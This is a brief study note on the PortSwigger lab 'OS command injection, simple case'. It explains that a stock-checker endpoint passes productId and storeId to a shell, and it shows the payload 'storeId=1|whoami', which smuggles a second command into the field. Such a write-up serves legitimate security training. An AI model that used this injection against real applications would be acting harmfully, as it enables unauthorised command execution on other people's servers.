# Lab: OS command injection, simple case
url: https://portswigger.net/web-security/os-command-injection/lab-simple

# Overview:
- Contain an OS command injection vul in the product stock checker
- The app executes a shell command containing user-supplied and store IDs, and returns the raw output from the command in its response
- Execute whoami to solve lab

# Analysis:

POST request: productId=1&storeId=1

append: productId=1&storeId=1|whoami

